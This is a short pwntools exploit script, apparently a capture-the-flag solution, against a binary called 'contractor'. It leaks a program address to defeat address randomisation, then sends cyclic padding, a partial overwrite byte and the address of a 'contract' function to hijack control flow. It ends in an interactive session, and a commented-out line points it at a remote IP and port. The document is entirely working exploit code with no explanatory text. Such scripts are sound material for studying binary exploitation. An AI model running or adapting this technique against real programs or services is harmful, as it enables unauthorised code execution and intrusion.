from pwn import *

bin_name = "./contractor"

elf = ELF(bin_name)
context.binary = elf

p = gdb.debug(bin_name, """
              b *(main+179)
              b *(main+1328)
              b *(main+1640)
              c
              """)
# p = process(bin_name)
# p = remote("94.237.54.139", 47135)
p.recvuntil(b"> ")
p.send(cyclic(16))
p.recvuntil(b"> ")
p.send(cyclic(256))
p.recvuntil(b"> ")
p.sendline(b"1023")
p.recvuntil(b"> ")
p.send(cyclic(16))

data = p.recvuntil(b"> ")
print(hexdump(data))

__libc_csu_init = elf.symbols['__libc_csu_init']
elf.address = int.from_bytes(data[0x2de:0x2e4], 'little') - __libc_csu_init 
contract = elf.symbols['contract']

print("contract address:", hex(contract))

p.sendline(b"4")
print(p.recvuntil(b"at: "))
# Limit : 0x61
#p.sendline(b"X"*255)
data = flat(
        cyclic(32),
        b"\xaf",
        p64(contract),
    )
print(hexdump(data))
p.sendline(data)
# print(p.recvall())
#print(p.recvuntil(b"> "))
#p.sendline(b"Yes")
p.interactive()


